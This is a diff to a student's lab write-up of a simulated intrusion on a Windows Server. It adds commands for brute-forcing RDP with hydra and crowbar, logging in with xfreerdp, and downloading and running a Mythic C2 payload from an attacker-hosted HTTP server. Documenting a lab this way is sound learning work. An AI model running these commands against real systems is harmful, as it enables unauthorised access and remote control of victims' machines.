@@ -61,6 +61,11 @@ The attacker machine performed a brute-force attack against the Windows Server R
 
 - Hydra
 - Crowbar
+```
+crowbar -b rdp -U Administrator -C password.txt -S x.x.x.x/32
+
+hydra -l Administrator -P password.txt rdp://x.x.x.x
+```
 
 After multiple authentication attempts, valid credentials were obtained.
 
@@ -69,6 +74,9 @@ After multiple authentication attempts, valid credentials were obtained.
 ## 3. Remote Access
 
 Using the compromised credentials, the attacker successfully logged into the Windows Server via RDP.
+```
+xfreerdp /U:Administrator /P:password /V:x.x.x.x
+```
 
 ---
 
@@ -85,13 +93,23 @@ A Mythic Apollo payload was generated and delivered to the Windows machine using
 ### Payload Delivery Example
 
 ```bash
+#on mythic hosted ubuntu
 python3 -m http.server 9999
 ```
+```
+#on rdp windows
+Invoke-WebRequest -Uri http://x.x.x.x:9999/payload-name.exe -OutFile "C:\user\public\downloads\payload-name.exe"
+```
+
 ---
 
 ## 6. Payload Execution
 
 The payload was executed on the victim machine, establishing communication with the Mythic C2 server.
+```
+cd C:\user\public\downloads\
+.\payload-name.exe
+```
 
 ---
 
@@ -110,6 +128,8 @@ Remote shell access
 ## 8. Data Exfiltration
 
 Sensitive files were downloaded from the compromised Windows machine to simulate data theft.
+
+---
 
 # 🧠 Cyber Kill Chain Mapping
 
@@ -137,6 +157,6 @@ The author is not responsible for any misuse of this project.
 
 ## 👨‍💻 Author
 
-Solanki Aakash Girishbhai
-Cyber Security Student
+Solanki Aakash .
+Cyber Security Student.
 Final Year Project
